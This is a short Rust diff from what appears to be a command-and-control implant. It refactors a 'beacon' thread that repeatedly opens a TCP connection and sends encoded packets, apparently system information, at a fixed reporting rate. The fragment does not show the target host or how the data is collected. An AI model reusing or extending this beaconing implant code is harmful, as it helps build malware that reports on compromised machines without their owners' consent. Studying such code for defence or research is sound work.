@@ -11,13 +11,7 @@ use common::{IMPLANT_REPORT_RATE_SECONDS, Packet, SystemInfo, encode};
 use rand::{Rng, rng};
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
-    start_reporting_thread();
-
-    loop {}
-}
-
-fn start_reporting_thread() {
-    thread::spawn(move || {
+    let beacon_thead = thread::spawn(move || {
         loop {
             connect()
                 .write(
@@ -34,6 +28,10 @@ fn start_reporting_thread() {
             ));
         }
     });
+
+    beacon_thead.join().unwrap();
+
+    Ok(())
 }
 
 fn connect() -> TcpStream {
